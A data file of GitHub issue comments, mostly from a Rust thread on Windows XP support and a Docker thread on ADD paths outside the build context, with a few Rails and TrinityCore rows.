rails/rails/5228/6223270,5228,@friend Answer is No. User is able to update HIS public key record AND he updates it with new user_id. code ,,False
rails/rails/5228/450526128,5228,"@friend What the fuck, why are you on about babys, rape and pedophiles you sick fuck. oh my god people are so weird nowadays ",,False
rails/rails/5228/452562187,5228,"@friend I was arguing in a convoluted metaphor that the default convention should protect newbie developers (""babies"") from hackers (""pedophiles and rapists"".) Reading the comment now, I do agree it was in poor taste. The analogies were an attempt to make a dry concept humorous, and in retrospect I see can how the comment can be seen as inappropriate. It's been six years since I made that comment, and I was a naive 21-year-old at the time, so please forgive me. ",,False
rails/rails/5228/452595508,5228,"@friend Yeah it's OK, just maybe not speak like that elsewhere or your account might be taken down 😉 ",,False
TrinityCore/TrinityCore/20683/267445916,20683,Description Initiate Emeline and Initiate Colin should talk every once in a while. Branch(es) both. TC rev. hash/commit 7dc97c035350f9505a9fba0b8ec2d2037044e586 TDB version 335.63 Suggested fix ,,False
rust/rust-lang/12842/29251641,12842,"I've made some investigation recently, and found that, there are only two APIs which are not supported by Windows XP, throughout the repo tree. There are  CreateSymbolicLinkW, only used by nativeiofilesymlink() GetFinalPathNameByHandleW, only used by nativeiofilereadlink()  And nativeiofile{symlink,readlink} are never used throughout the repo tree, except stdiofs{symlink,readlink} (which are really never used). Do we really need including symlink/readlink functionality inside std? How other languages do? Currently Windows XP is still wildly used in the world, especially in Asia. Its installed volume is much more than Mac OS + Linux + Unix. We give up supporting XP just because of two api absent? Maybe it's wrong. cc #11950 update readlink is used by rustcmetadatafilesearch. update This is my branch   I just commented out the usage of CreateSymbolicLinkW and GetFinalPathNameByHandleW. This make the new rustc.exe run successfully in Windows XP, ant it works mostly OK (see my latest comment below). ",,False
rust/rust-lang/12842/37393894,12842,I thought there were mutex and condition variable APIs that are not supported on windows XP too? ,,False
rust/rust-lang/12842/37394264,12842,"@friend  After remove CreateSymbolicLinkW and GetFinalPathNameByHandleW, I've made rustc run in XP (it works ok). More investigation need to be done perhaps. ",,False
rust/rust-lang/12842/37394364,12842,"Oh, really? Does it pass tests? (cc  ) ",,False
rust/rust-lang/12842/37395135,12842,"I don't know. On Windows platform (even Win7),  always fails. see #12745 ",,False
rust/rust-lang/12842/37395206,12842,"or even just  should pass (at least, they pass on the buildbots). ",,False
rust/rust-lang/12842/37395322,12842,"I'll have a try. Thank you! @friend In general, a .exe can't be start up, if it includes unsupported APIs in Import Table. Before i remove CreateSymbolicLinkW and GetFinalPathNameByHandleW from source, rustc can't be start up in XP; after removing, the new rustc runs normally. So I think, rustc doesn't require other unsupported API. Will prove it. Update my new rustc.exe can be loaded successfully by depends.exe in XP. Yes, It has no other dependency. ",,False
rust/rust-lang/12842/37399067,12842,"@friend  run-pass [stage2] test\run-pass\exponential-notation.rs task '&lt;main&gt;' failed at 'called  on a  value', D\MinGW\msys\1.0\home\LIIGO\rust\rust\src\libstd \option.rs148 make *** [i686-pc-mingw32/test/run_pass_stage2_driver-i686-pc-mingw32.out] Error 101 make check-stage2-stdCreateSymbolicLinkWGetFinalPathNameByHandleW`. ",,False
rust/rust-lang/12842/37400663,12842,Might be an issue with UTF8 or floating point arithmetic on XP? ,,False
rust/rust-lang/12842/37404388,12842,"@friend Are you sure? I've compiled the std and its tests from source in Windows XP using my new rustc.exe. Compiled OK,  most tests passed, and some tests failed (1276 passed; 41 failed; 134 ignored) (Looks like all failures are from libgreen and libnative. But I don't know why currently.) ",,False
rust/rust-lang/12842/37404548,12842,I just looked at that test you failed for uses of Option.unwrap. Was trying to suggest why the test was failing even though you didn't change anything. ,,False
rust/rust-lang/12842/37421743,12842,"Thank you! 2014年3月12日 下午853于 ""Ben Harris"" notifications@friend.com写道： ",,False
rust/rust-lang/12842/37448049,12842,"@friend Rust doesn't expose native condition variables yet. When it does, that's another API that's missing on XP. I don't think Rust should support an operating system not receiving security updates because encouraging any continued use of it is irresponsible. I don't think we should add a further burden to working on the concurrency and I/O implementation. It's already very hard to improve because libuv defines a lowest common denominator it needs to support, and XP would be another. ",,False
rust/rust-lang/12842/37489072,12842,"@friend I disagree with you. C, C++, Java, C#, Python, Ruby, Scala, and many more, all support Windows XP. ",,False
rust/rust-lang/12842/37490527,12842,"Without knowing much about it, it doesn't look too onerous to take some functions out of the extern block and replace them with a  call and checking for null. Probably worth writing up an RFC if you want XP to be supported properly. It will end up with lots of . ",,False
rust/rust-lang/12842/37502619,12842,"@friend plus one @friend most of those don't claim any sort of safety guarantees, some are laughably worse than others (I'm looking at you, Java) and I don't expect any of them (maybe Scala?) to have condition variables in core libraries. @friend runtime failure based on feature set is unacceptable, at worst I'd expect to see two different OSes for Windows,  having features disabled in libraries via  (and lowering the minimum API level somewhere, I know there is such a thing on Windows). ",,False
rust/rust-lang/12842/37503103,12842,"Supporting Windows XP means Rust will need a homegrown implementation of condition variable, among other problems. It won't be possible for it to be included in the generic Windows target without performance hits because branches + bloated code aren't always acceptable. I think it's unethical to care about usage share to the point where users are encouraged to remain on an insecure platform without security updates. If Apple or Microsoft isn't providing support, then we shouldn't be providing support. It gives us a nice gradual deprecation policy where we can actually migrate to new win32 APIs, etc. but I think the more important issue is the security one. To be honest, I can't really think of a use case for an XP target beyond malware development. It's not like XP users are going to buy your products or consider open-source software. ",,False
rust/rust-lang/12842/37526444,12842,"Lucky for the malware developers, I imagine   will allow them to write safe concurrent malware in rust for windows xp. ",,False
rust/rust-lang/12842/37611829,12842,"I agree with @friend, Windows XP is about to reach the end of it's already significantly extended support lifetime, and has been without mainstream support for almost 5 years now. Bending over backwards for it is just not worth it. At the age of 13, XP is stupidly old. If there are small, unobtrusive changes you can make so rustc still works on XP, then fine, but official support doesn't make sense. We don't even list BSD as an officially supported build environment, and that's an actively-developed OS! ",,False
rust/rust-lang/12842/37622936,12842,"I plus one the drop of XP. It is like using IE6 polyfills when doing web developement, not only you do have to include more hacks to support it but it is also making users believe they have a viable platform. Which is not the case. ",,False
rust/rust-lang/12842/37627817,12842,Although the experiment of making it run on XP may be fun (?) I don't think we should add official support for it (again?).  @friend @friend any thoughts about this ? ,,False
rust/rust-lang/12842/37680628,12842,"Although I personally agree that official XP support should be dropped, it may be worth asking some video game developers for their opinions.  I'm not a hard core gamer, but I believe there is still a significant number of gamers that use XP due to some performance issues in Windows 7 and 8.  Of course by the time Rust is actually used in a commercial game this may have changed.  Rust shouldn't do anything that may alienate the video game development crowd. ",,False
rust/rust-lang/12842/37689497,12842,"Personally, I am happy to take patches that improve compatibility with xp as long as it doesn't have a big impact on the design. Having a design that is compatible with diverse environments is good for more than just xp. The issues preventing Rust from working on xp appear minor and solvable. I don't want to 'officially' support xp though. ",,False
rust/rust-lang/12842/37690132,12842,"@friend Removing symlink/readlink functionality or leaving out native condition variables (as we currently do) would hurt the quality of the project elsewhere. If XP is going to be supported, it needs a separate target to use in  or at least stubbed out functionality that's conditionally linked against. ",,False
rust/rust-lang/12842/37744757,12842,"Libuv has itself condition variables implementation to Support XP. 2014年3月15日 上午411于 ""Daniel Micay"" notifications@friend.com写道： ",,False
rust/rust-lang/12842/42272857,12842,I don't think it's acceptable to have a hard dependency on libuv for binaries not using libgreen. It doesn't make sense to add a whole bunch of overhead to support a dead operating system... I doubt that the libuv implementation of condition variables is efficient. ,,False
rust/rust-lang/12842/42386036,12842,"We could design a symlink api that can report ""not supported"". On Mar 14, 2014 111 PM, ""Daniel Micay"" notifications@friend.com wrote ",,False
rust/rust-lang/12842/44311734,12842,There is a new non-XP symbol in . ,,False
rust/rust-lang/12842/61780086,12842,[llvm-dev] RFC Drop support running LLVM on Windows XP ,,False
rust/rust-lang/12842/66014423,12842,"@friend plus one  I'm currently developing a program for customers using Windows XP, and the decision can not be made by me to upgrade their OS. So for now I have to choose golang. Just like oracle dropped support for java6, then RedHat picked it up, because too many clients are still using java6. ",,False
rust/rust-lang/12842/75184834,12842,We aren't even supporting VIsta right now. ,,False
rust/rust-lang/12842/76660839,12842,Servo was expected to be run in Windows XP [2015-01-01]  ,,False
rust/rust-lang/12842/76667761,12842,"To be clear, that discussion is not about running the servo rendering engine on windows xp (it doesn't run on any version of windows atm, aiui), but rather some components written in Rust to be incorporated into Gecko. The distinction is somewhat important because the components may be restricted enough to not use any of the major features XP is missing, meaning that reaching level of support needed for that purpose may not be (a) very hard, and (b) may not be enough for many other applications. ",,False
rust/rust-lang/12842/76674381,12842,"FWIW, here's a list of APIs used by libstd, that are missing on Windows XP AcquireSRWLockExclusive AcquireSRWLockShared CancelIoEx ReleaseSRWLockExclusive ReleaseSRWLockShared SetFileInformationByHandle SetThreadStackGuarantee SleepConditionVariableSRW TryAcquireSRWLockExclusive TryAcquireSRWLockShared WakeAllConditionVariable WakeConditionVariable ",,False
rust/rust-lang/12842/77077073,12842,"Hi, thanks for the list, that's quite useful to have if that's all of them. Personally I'd like to see a full Rust core toolchain working on XP, since that's the best way to know that things are working reasonably; we can just run the existing test suite.  You could then run Rust compiler in an XP VM if you want. Problem there of course is LLVM unhelpfully dropping support for XP.  Might be good to keep tabs on what incompatibilities that's trying to bring in, and maybe maintain an XP compatible version of LLVM as well (ought to be a lot easier than trying to backport later).  I reckon the wider open source community would be interested in this when they realise compilers they use no longer function on XP. Main question I think is whether backwards compatible alternatives to those APIs should just replace whatever's there currently or should be included only when those APIs aren't available (be it just XP or Vista also).  Benefit of dropping them completely is that the same code is then being run and tested on Win7 as on XP/Vista, so things seem more likely to work across the board (and more consistently) and there's no chance of Rust's software architecture for XP needing to be different.  Downside is that use of these APIs might be more efficient and some features/capabilities may be lost.  It might even be required to use certain APIs to get things working in Vista/Win7 which don't exist in XP. Indeed the best approach might be to avoid new APIs unless they're either non-essential (e.g. a security feature that should be enabled) or actually required for correct functioning on the newer OS since there is no alternative.  N.B. such alternatives may be considerably more complex than 'convenience' APIs involving a lot more manual coding or restructuring; however compatibility is highly valuable and custom code using simpler primitives permits much more flexibility in the implementation (which you definitely can't get if you rely on OS code to do all the work). Indeed it is possible to write code which outperforms the OS and maybe even avoids any use of expensive system calls at all.  Given this is a compiler for what claims to be a systems programming language, it doesn't make a lot of sense to rely on high level OS functions in the first place, if there are ways to achieve the same within the Rust system core, using low level primitives.  As such, similar arguments may apply to use of certain syscalls/libraries in Linux. Needless to say, writing a Rust OS becomes easier the more stuff libstd can do without OS support for a particular CPU architecture (and anything that works in both Windows and Linux should work on a Rust OS too).  Synchronisation between threads is definitely something I'd expect to be in that category. ",,False
rust/rust-lang/12842/84199968,12842,"Please, please consider this. I regularly develop for customers using Windows XP. The situation is pretty common in controls engineering and chemical engineering. The ability to emit executables that run on XP is valuable. Even a separate target for XP that lacked mutexes and condition variables would be mildly useful, although I've read interesting emulation methods for condition variables. ",,False
rust/rust-lang/12842/99903852,12842,"I think attitude is important. Kicking out XP would be a mistake after all, because XP will survive a lot longer than your expectation, owing to the virtual machines. XP is insecure, yes, but nothing is 100% secure. Warm acceptance is very important, if you want your beloved Rust-lang to become a true descendant of C/C++. ",,False
rust/rust-lang/12842/114403605,12842,Firefox want to integrate some Rust code or library (such as mp4 parser and url parser). But Firefox is still required to be run in Windows XP as before. This is another reason for Rust to support XP. ,,False
rust/rust-lang/12842/115021126,12842,"I'd love to use Rust at work and am currently exploring use-cases where that might be possible. However, I definitely need Windows XP support to work for the projects I'm working on. I don't need the compiler/toolchain to work on XP, but the produced executables should definitely run on XP. I can totally accept some APIs not being available on XP (not sure how to mark that during compilation though). But having a Hello World program crash at start with ""AquireSRWLockExclusive could not be located in kernel32.dll."" is bad. I would be glad if you could you reconsider at least partial support for XP. ",,False
rust/rust-lang/12842/115025282,12842,I will work on adding support for XP soon. ,,False
rust/rust-lang/12842/115031408,12842,@friend Thank you! Can I track this progress somewhere? I would love to be up-to-date on this ) ,,False
rust/rust-lang/12842/115032683,12842,@friend I'll keep this issue updated on any work I do towards this. ,,False
rust/rust-lang/12842/115045458,12842,"@friend awesome! I was also planning on getting XP working soon, so if you have any questions feel free to reach out to me on IRC. ",,False
rust/rust-lang/12842/115077112,12842,"I disagree with literally every aspect of this.  Hamstringing modern Rust for the sake of an operating system that has been discontinued would be ludicrous.  Rust is an opportunity to get rid of dumb decisions in past languages. Do what you want on Windows XP, but don't take away my modern APIs or their modern implementations. ",,False
rust/rust-lang/12842/115086199,12842,"Rust is just a new language - not very plausible to thrive, yet. So Rust needs to support as large community as possible. So giving a simple and easy work-around for XP is necessary. The idea of banning XP completely is a silly and dangerous idea. You don't want your beloved language Rust appears to be obstinate, do you? ",,False
rust/rust-lang/12842/115106510,12842,"@friend Supporting an obsolete version of an operating system riddled with zero days and receiving no security updates is actually dangerous and maybe even irresponsible. Besides, PRs are accepted if you want to make something compatible with XP as long as it comes at no perceivable cost for newer versions, there is no ""banning"", it's just not ""necessary"" or high-priority. ",,False
rust/rust-lang/12842/115117546,12842,"Killer argument – I think I'll just leave my door open from now on because well, no lock is 100% secure anyway. ",,False
rust/rust-lang/12842/115118799,12842," Rust code will not be allowed in Firefox unless Rust supports XP We want Rust in Firefox Therefore, Rust must support Windows XP  ",,False
rust/rust-lang/12842/115324420,12842,"For how long will Firefox continue to support XP? When will a Firefox version be released (meant for users, not developers) that contains rust code? ",,False
rust/rust-lang/12842/115330525,12842,"@friend Looks like Firefox will continue to support XP indefinitely. As for your other question, there is this tweet ",,False
rust/rust-lang/12842/115339510,12842,"I very much doubt that XP will be supported indefinitely. Over the years support for Windows 95, 98, ME, and 2000 (and of those 2000 was actually a quite decent ) ) has been dropped. XP will follow, it's only a matter of time. So given that, is supporting XP really worth it? ",,False
rust/rust-lang/12842/115343434,12842,Because XP seems more likely to survive longer than those who want to extinct it. ,,False
rust/rust-lang/12842/115343497,12842,"I understand the word ""indefinitely"" to mean that there are no plans to drop support for it, instead of ""forever"". Note that XP is still a very large market, and is said to have more users than desktop Linux. ",,False
rust/rust-lang/12842/115344869,12842,"@friend The question is - how much time. Looking at graphs at netmarketshare.com (and looking around!) I can easily imagine it being quite popular in 2020. In this case the support is probably worth it. (I was going to look at Vista/XP support later this year, but since @friend works approximately 100x faster than me, it won't probably be necessary.) ",,False
rust/rust-lang/12842/116614355,12842,"First of all Thank you so much for fixing this! This is awesome! plus one Is there a way to detect at compile time or at application init time whether a panic'ing API would be used? If I have an app that should run on Windows XP, I don't want to have to test every code path to make sure some unsupported API doesn't panic... Thanks in advance for your consideration! ) ",,False
rust/rust-lang/12842/116663220,12842,"Not currently, no. ",,False
rust/rust-lang/12842/116701155,12842,"Is this planned or possible? I think that would be crucial to be able to write code without being ""really careful about which APIs to use"". If I wanted to be careful, I wouldn't choose Rust ;) ",,False
rust/rust-lang/12842/116712283,12842,Not currently. You may want to open an issue on the RFCs repo and/or write up an RFC with details on how to do such a thing. ) ,,False
rust/rust-lang/12842/116728055,12842,@friend I'm sure I understand this joke Do you mean Rust is too young? ,,False
rust/rust-lang/12842/116733443,12842,"I meant ""If I wanted to be careful about which API to call in order to not panic, I wouldn't choose Rust"". I want my rust to ""it compiles, let's ship it"" ;) ",,False
rust/rust-lang/12842/116788876,12842,"I'm waiting for the nightly to try out this patch. When I run my Rust program on WinXP at the moment currently I get 'the procedure entry point TryAcquireSRWLockExclusive could not be located in the dynamic link library kernel32.dll' With this patch, I'm wondering, will my program likely just panic out, or may it run. ",,False
rust/rust-lang/12842/116795922,12842,"This will take some time to propagate into the nightlies currently. The 32-bit Windows compiler is currently still using MinGW and is unlikely to work on Windows XP (although I have not tested this). The triple I tested was , which we currently cannot build a compiler for due to this LLVM bug. Instead you'd need to build a compiler which can target . We don't currently build nightlies for targets like this either (e.g. we have no android nightlies), but this is also coming soon! tl;dr; to try out XP support you need to do this ",,False
rust/rust-lang/12842/116800822,12842,"Thanks a lot! I'll give that a shot, I didn't realise it requires a separate target ",,False
rust/rust-lang/12842/116883726,12842,I'm a tad confused I've ended up with a rustc in the stage2 dir you mention however during compilation I got I've tried doing ,,False
rust/rust-lang/12842/117239816,12842,"@friend you probably won't get very far if the build doesn't complete, so I'd start out diagnosing why  didn't build. Perhaps a reconfigure was needed? ",,False
rust/rust-lang/12842/117272357,12842,"Oh wow it looks like I just totally forgot to commit the file! I'll add it in a PR I'm prepping now, but you can add  with these contents ",,False
rust/rust-lang/12842/117283858,12842,"Cheers!  That works for me. In msys2 I did, just so I don't forget ;) ",,False
rust/rust-lang/12842/117316709,12842,"Just wondering if anyone can point me in the right direction, I can compile a simple rust program fine, but I'm getting the following error with a more complex one ",,False
rust/rust-lang/12842/117330290,12842,The MinGW target seems to work for Windows XP. Or at least  gets this far ` Looks like the test infrastructure already relies on condition variables for something. ,,False
rust/rust-lang/12842/117349526,12842,@friend Was that using the latest nightly build then? ,,False
moby/moby/2745/22832585,2745,"If you have an add line in the Dockerfile which points to another directory, the build of the image fails with the message ""Forbidden path"". Example Gives I would expect the file to be written to , not . ",,False
moby/moby/2745/298188258,2745,"thought I had a good project folder. found out sym links and relative pathing doesn't work. this appears to be just an issue about where to source the files from, so it looks like we have to create two docker files. which is depressing ",,False
moby/moby/2745/298190761,2745,"You have to review the Directory and are u familiar with OLE, registry, dos system, before you take into account open source project that is pretty much extensive research. Usually we take into account what needs to be in place before rewriting for open source.I don't know why GitHub came first into a entity catalog. No proposal was in place for the designated  doc to be available. No request was sited. We don't shift the focus on and off so people can generalized on how linear regression analysis should have been to the rest of the world at large. Hope you get my drift!! Wishing the best..... Cheers, -Moderntheory On Apr 29, 2017 207 PM, ""Eric Xanderson"" notifications@friend.com wrote ",,False
moby/moby/2745/307592742,2745,So much for running a microservice architecture with multiple repositories and Dockerfiles. / Please reopen. ,,False
moby/moby/2745/312158442,2745,"This is something that baffles me also.  I just ran into this limitation, and I can't see any reason for it.  To say this is a security issue due to malicious people placing bad lines in their Dockerfile and then telling people to clone, build, and publish the image is utter and complete nonsense.  If I pull a Dockerfile from the Internet (github or whatever) and blindly follow orders without looking at the file to create an image that I subsequently blindly and naively publish to a public repository, I will reap what I deserve.  To limit the product for that edge case is specious logic at best. It's frustrating to see so many people speaking out with user experiences just to get shut down, ignored, and brushed off by a small number with a concrete, inflexible, uncompromising, and narrow worldview of how they want their software to be.  So many great ideas have withered and died from that kind of creativity-strangulation.  Docker might be on that slate pretty soon, if these frustrations are significant to more than just this one issue. ",,False
moby/moby/2745/312350839,2745,  ,,False
moby/moby/2745/312450618,2745,"@friend - you hit the nail on the head. i would like to use docker, but this issue is show-stopper for me and I suspect many others. I take responsibility for what software I choose to remotely include as part of my own and I don't need/want authoritative hobblings of what I can do with software and which effectively take away my responsibility with the lame excuse/insult that I (and the larger group of my peers) am irresponsible. I build my own dockers from the ground up anyway so that ""security"" issue does not apply in my case. If they want to continue with this foolishness, they do it at their peril because there are competitors nipping at their heels - I'm just doing my research on  - I haven't yet fully understood if it is the replacement I'm looking for but I suspect it will be the docker killer. ",,False
moby/moby/2745/312464210,2745,"@friend @friend @friend  As it has already been mentioned numerous times it's not purely a security issue. Docker has a client-server architecture. Docker builder is currently implemented on the server side. So if you want to use files outside build context you'd have to copy those files to docker server. One things docker newbies don't realize is that you can keep Dockerfile separate from build context. I.e. if you have , ,  you can still set build context to root. But the next thing you'll complain about is that build would take prohibitively long as you now have to copy whole  directory to the machine where docker server resides. ",,False
moby/moby/2745/312464420,2745,"@friend Regarding a security issue consider this You're a docker hosting provider (or CI) and allow people to upload their git repositories with Dockerfiles. Since you want to be as efficient as possible, you implement your service with docker containers. If you allow people to reference any files on your server you'd risk that people would be able to expose images to each other. How would you solve this? ",,False
moby/moby/2745/312464547,2745,@friend Packer is not a competitor currently. It's a tool to build VM images. Though I can imagine packer to be able to build container images at some point. ,,False
moby/moby/2745/312464603,2745,@friend Why aren't you satisfied with my comment? Doesn't it sound reasonable? Do you have any questions remaining? Do you have a solution to the problem I described? ,,False
moby/moby/2745/312466247,2745,@friend  You run people's dockers inside their own containers. ,,False
moby/moby/2745/312468328,2745,@friend So you propose to use docker in docker to build images? It would be very inefficient and still insecure. The kernel is shared however deep DinD you use and since docker has root privileges it's hackable. ,,False
moby/moby/2745/312468377,2745,"Sorry, I don't understand what's the meaning of ""dockers"" here. ",,False
moby/moby/2745/312520349,2745,I suppose it could be a Docker in Docker but there are many options for virtualization depending on your platform. ,,False
moby/moby/2745/312531622,2745,"@friend So, can that not be done automatically?  If I specify a file out of the context, is it not possible and/or feasible to automatically copy it to the server in order to build it into the image? So, the unfortunate haughty attitude to your ""newbie"" users aside, this is actually what has already been suggested (by @friend  above), and as I stated in my own post, this is the solution I am currently using.  This works for me.  However, if I had multiple, shared config, and my individual docker images were rather big, this would get fairly prohibitive, as it has been stated by others that each docker image would contain the files for every other docker image, even though it would never need them.  I could easily see why people would be frustrated by what they could easily see as stonewalling in refusing to work with users' requests and needs and implement this feature. ",,False
moby/moby/2745/312541055,2745,"Won't you as easily see why maintainers be frustrated? If you read the docker history, you'd know that this whole ""docker"" concept was developed in-house (in ""dotCloud"" then) as a tool to efficiently use server resources. No, it's not ""setting up a situation"". It's a historic fact. Sure. Just like in any ""as-a-service"". There would be only one docker daemon, so yes. Otherwise you'd need to set up a separate docker daemon for each user which is impossible on one host (so would require actual virtual machine for each user, rendering containers and docker meaningless for that use case). It is not a security concern for running containers (since kernel isolates them), but it is a security concern when there are no containers yet (when you're building images). You're still saying as if each user runs a separate process. It's a server, remember? There's only one user. And one filesystem. That would require implementing application layer of access control on top of the system one. You're not forced to use docker to build images. Container image format is currently being standardized. So there are other tools you can build images with. When image is build, push it to image registry so that docker can pull it. And I'm sure when the build tool would be extracted out of the server monolith (#32925) relative path use case would be possible as the builder would run in a separate process under ""normal"" user. ",,False
moby/moby/2745/313932372,2745,"I'm running into this issue as well in a Go project. Here's how this became a problem for me I want to run a container for developing my server locally, which has the following approximate structure Inside of my Dockerfile, there are two options I can think of here  ADD ../ /go/src/MyOrg Only add the main package and then install the dependencies from the repo  The first option doesn't work because of this bug The second option isn't only awful, but doesn't work because of moby#24489 and MyOrg happens to be bristling with private repos My only other option is to put all the dependencies into the vendor file Now if I ever want to update Dependency/dep.go I have to run a script to manually copy Dependency folder into the vendor folder. Just bizarre. ",,False
moby/moby/2745/313932689,2745,"Wouldn't it be trivial for Docker to do quick static analysis and detect whether a relative parent directory is being accessed? Then when you try to run or build it, it would abort saying Even if you can't analyze it before running the Dockerfile, then just abort with the same error message when you encounter the offending instruction. ",,False
moby/moby/2745/313968829,2745,"@friend It looks like you want to link statically with some library? For production image, I see 3 solutions 1) Treat it as a thirdparty library with its own release cycle  Publish  using go package manager In  fetch all dependencies using go package manager  2) Treat it as a part of your application with synchronous release cycle  Move  to  Add additional  if you want to release Dependency separately  3) Move Dockerfile to For development image there's a 4th solution 4) Just use docker-compose  use image with Go build tools mount  to  use go command to build normally as you would without docker  ",,False
moby/moby/2745/314042060,2745,"Your #2 is a non-solution if the Dependency is used by more than one MyOrg projects, which, if I understand correctly, is the entire point of @friend's setup. 3 also breaks once there is more than one top-level project. That really leaves us with just solution #1, which is a lot of hassle for something that should be a non-issue. Virtually every build system on the planet supports this setup (e.g. CMake's  actually lets you ascent into the parent directory etc.); Docker is the special needs child here ) ",,False
moby/moby/2745/314101562,2745,"Dependency management is always an issue. Often there's a temptation to dump everything into one repository (like they do at Facebook and Google), but it's not an option in the open source community. And when you have multiple repositories you must either use git clone or some other package source. The thing is, docker is not a build system. It's not designed as a build tool. Build functionality is only a necessity and it has very limited capability. You can't use multiple Dockerfiles to build one image (without intermediate registry step), you can't import Dockerfile (you can only use other image as a base), there were no multistage builds until recently. So yeah, if you need a build tool, use CMake (or ) and then just add artifacts to the result image. ",,False
moby/moby/2745/318703962,2745,So why can't we do this? A tool should not be enforcing it's own ideology onto it's users when it's designed to be as versatile as possible. ,,False
moby/moby/2745/319736168,2745,"plus one. Basically I have a JAR file for instrumentation that needs to be in every single micro-service, but is quite large. Due to change in infrastructure (Rancher for orchestration instead of ad-hoc docker scripts) it will no longer be ""easy"" for me to mount the JAR for instrumentation in the target container at runtime, so I need to supply it to Dockerfile and copy it inside the container at build time. Well, the JAR is quite big so it is in the parent directory of all the micro-services directories (each containing their own Dockerfile) Due to this ""limitation"" I am force to copy/clone a 50MB+ JAR into every simple micro-service (10+) directory... Not healthy for my co-workers machines or the Git repository. Providing a flag such as  to docker build would not be outside of the realm of possibility. The Dockerfile would have to be pre-processed before bundling the context to analyse dependencies from outer directories which would then be added to the context bundle, right? In my mind this does not look like a very far-fetched feature-request - but rather quite sensible usage. Cheers Dan ",,False
moby/moby/2745/319814959,2745,"Just FYI to anyone here, the best solution I have found so far, was to simply to simply copy the Dockerfile to the root of the project and give the file name a uuid. after building, then just delete the uuid file. worst case is the Dockerfile doesn't get deleted, but it's a uuid, so it shouldn't really matter. I tried symlinks up the wazooo, did not work. Copying the file to the root of the project the uuid isn't as pretty as symlinks, but it does work. ",,False
moby/moby/2745/319816125,2745,You can just build the Docker context directly ,,False
moby/moby/2745/319828234,2745,If JAR file is static you shouldn't include it to your git repository. Here's a proper way  Build a base image (e.g. ) with JAR file included Create a Jenkins (or other CI) pipeline where you build and push the  image to the registry On each microservice's Dockerfile use base JAR image   ,,False
moby/moby/2745/319839656,2745,You can use multi-stage builds; Create a Docker image for your packages (or build several of such images) Dockerfile FROM scratch COPY instrumentation.jar / bash docker build -t my-packagesv1.0.1 -f Dockerfile.packages . Dockerfile FROM my-packagesv1.0.1 AS packages FROM nginxalpine COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM mysql COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM my-other-packagesv3.2.1 AS other-packages FROM my-base-image COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar COPY --from=other-packages /foobar-baz.tgz /some/other-path/foobar-baz.tgz ♠ ,,False
moby/moby/2745/319994747,2745,"@friend The trick I've used in the past is to use symlinks and then rsync everything with symlink resolution to a separate folder for building. It doesn't really work if you have really large files in your build, but for most use cases it's a workaround that can get the job done. ",,False
moby/moby/2745/320093645,2745,  ,,False
moby/moby/2745/320101689,2745,"@friend  thanks, I will look into that...I have to support generic building of projects for the purposes of library code, so the stupid trick of copying the Dockerfile to the project is the only lightweight thing I can think of, where the only thing being copied is the Dockerfile itself. Seems dumb but works lol. ",,False
moby/moby/2745/321392664,2745,"This is extremely unfortunate. At this point, it's physically impossible for me to add any new ideas, since all of them have already been brought up. But for some reason, the Docker people seem to keep complaining about security aspects. This makes less than zero sense just add an  flag, which is disabled by default. Boom everyone is happy. Can we stop pretending that security is a concern here? If the attack vector is that an attacker somehow convinced me to run  on their , then I think I'm stupid enough that they also could have convinced me to run . ",,False
moby/moby/2745/321798792,2745,"I think you're missing one important difference docker runs in a superuser context. And no, you're not supposed to be stupid to be convinced to clone some project from GitHub and run . ",,False
moby/moby/2745/323597730,2745,LXDock is interesting  the warning - duly noted and highly appreciated ) ,,False
moby/moby/2745/341609059,2745,"5 years later and docker still issues this cryptic error message that rivals ones from nuget. How about at least putting in ""Even though you are in path X when you issued the  command, and your dockerfile has a path relative to X, and you have specified a working directory in the dockerfile, docker is going to be working in path Y (ps. u r stupid noob)"" At least I think that's what the obstacle preventing me from completing a basic walkthrough.  This tech seems great and all, but I shouldn't need to spend a few weeks researching the ins and outs and dealing with 5 year old bugs like this just to try it. ",,False
moby/moby/2745/344426031,2745,"This appears to still be a bug, at least is presenting itself today in what feels like a very routine use-case. ",,False
moby/moby/2745/344531744,2745,"It certainly feels at first. But not after you learn how to mount your source and build directories, which is a recommended use case for development. You aren't supposed to rebuild your images on every source change. When you're comfortable with development use case, you can proceed to production use case, at which point you create  and use  to point docker builder at the root of your project. Then you realize that not all the files in your project are required for production. You begin to optimize it by creating build image and using build artifacts folder as a context for you production build. Then you learn about multistage builds and which point you're comfortable with a setup you have. If you need to put in your image something else from your HOME folder, like your private ssh keys (not a brightest idea), you can copy them to your project dir (surely you're not worried about security) or even commit them to git. ",,False
moby/moby/2745/346336781,2745,I just ran into this issue as well. Is there a reasonable workaround? I just want to mount a folder that is not in the docker folder... ,,False
moby/moby/2745/346484336,2745,"All this ""mount"" talk and ""Home folders"".  If anyone is going to fix the error to be more clear, please remember that some of us have C drives and %USERPROFILE%. ",,False
moby/moby/2745/346510774,2745,The way it works on Windows is network shares which is kind of a mount. ,,False
moby/moby/2745/346537191,2745,"Windows has actually had mounting for a long time, its just transparent to users unlike nix, I just didn't want to be further confused by nix specific messages while trying docker out on windows. Why would I create a network share to run a docker image on the host running on my local machine? That seems ""extra"", but if the error message said that was the problem I would fix it and not come bothering anyone. ",,False
moby/moby/2745/346695519,2745,"If you're talking about Docker on Windows, it still uses linux in a VM.  ",,False
moby/moby/2745/346695887,2745,When you run  it actually zips your src folder and transfer it to the docker server which executes commands from your . ,,False
moby/moby/2745/346696550,2745,"It looks like there are some people who want to reference any files from the . But Dockerfile parsing is done on the docker server. So there's no way it could know which files are referenced. Some people are asking to change message from ""Forbidden path"" to something more understandable. Does the message ""Can't reference files outside build context"" make sense to you? ",,False
